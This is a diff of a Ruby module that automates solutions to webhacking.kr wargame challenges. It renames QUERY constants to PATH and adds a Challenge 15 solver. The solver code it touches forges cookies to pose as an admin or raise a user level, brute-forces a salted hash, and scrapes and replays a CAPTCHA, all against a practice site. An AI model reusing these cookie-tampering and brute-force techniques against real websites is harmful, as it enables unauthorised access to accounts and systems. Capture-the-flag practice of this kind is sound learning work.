@@ -109,12 +109,12 @@ module WebhackingKR
   class Challenge1 < ChallengeBase
     CHALLENGE = 1
 
-    QUERY = '/challenge/web-01/'
+    PATH = '/challenge/web-01/'
 
     def exec
       log('Sending cookie')
       response = get(
-        QUERY,
+        PATH,
         { 'Cookie' => 'user_lv=3.5' }
       )
       check(response.body)
@@ -126,7 +126,7 @@ module WebhackingKR
   class Challenge4 < ChallengeBase
     CHALLENGE = 4
 
-    QUERY = '/challenge/web-04/'
+    PATH = '/challenge/web-04/'
     SALT = 'salt_for_you'
     FROM = 10_000_000
     TO = 99_999_999
@@ -149,7 +149,7 @@ module WebhackingKR
       loop do
         if (!i.zero? && (i % INTERVAL).zero?) || i >= TO
           file.rewind
-          response = get(QUERY)
+          response = get(PATH)
           match = %r(><b>([a-z0-9]{#{HASH_LENGTH * 2}})</b></td>).match(response.body)
           unless match
             failed
@@ -193,7 +193,7 @@ module WebhackingKR
       log("Key found: #{key}")
       log('Submitting key')
       response = post(
-        QUERY,
+        PATH,
         { 'key' => key }
       )
       check(response.body)
@@ -212,7 +212,7 @@ module WebhackingKR
   class Challenge6 < ChallengeBase
     CHALLENGE = 6
 
-    QUERY = '/challenge/web-06/'
+    PATH = '/challenge/web-06/'
     USER = 'admin'
     PASSWORD = 'nimda'
     ROUNDS = 20
@@ -222,7 +222,7 @@ module WebhackingKR
       password = encode(PASSWORD)
       log('Sending cookie')
       response = get(
-        QUERY,
+        PATH,
         { 'Cookie' => "user=#{user}; password=#{password}" }
       )
       check(response.body)
@@ -278,7 +278,7 @@ module WebhackingKR
       val = "1abcde_#{myip}\tp\ta\ts\ts"
       val = URI.encode_www_form_component(val)
       log("Sending value: #{val}")
-      response = get("#{PATH}#{QUERY}=#{val}")
+      response = get("#{PATH}#{QUERY}#{val}")
       check(response.body)
     end
   end
@@ -301,18 +301,32 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 15
+  class Challenge15 < ChallengeBase
+    CHALLENGE = 15
+
+    PATH = '/challenge/js-2/'
+    QUERY = '?getFlag'
+
+    def exec
+      response = get("#{PATH}#{QUERY}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 19
   class Challenge19 < ChallengeBase
     CHALLENGE = 19
 
-    QUERY = '/challenge/js-6/'
+    PATH = '/challenge/js-6/'
     LOGIN = 'admin'
 
     def exec
       userid = Base64.strict_encode64(encode(LOGIN))
       log('Sending cookie')
       response = get(
-        QUERY,
+        PATH,
         { 'Cookie' => "userid=#{userid}" }
       )
       check(response.body)
@@ -330,12 +344,12 @@ module WebhackingKR
   class Challenge20 < ChallengeBase
     CHALLENGE = 20
 
-    QUERY = '/challenge/code-4/'
+    PATH = '/challenge/code-4/'
 
     def exec
       start do
         log('Getting page')
-        response = get(QUERY)
+        response = get(PATH)
         match = /name=captcha_ value="([a-zA-Z0-9]{10})"/.match(response.body)
         unless match
           failed
@@ -355,7 +369,7 @@ module WebhackingKR
         log("Server time: #{st}")
         log("Sending CAPTCHA: #{match[1]}")
         response = post(
-          QUERY,
+          PATH,
           {
             'id' => 'tester',
             'cmt' => 'comment',
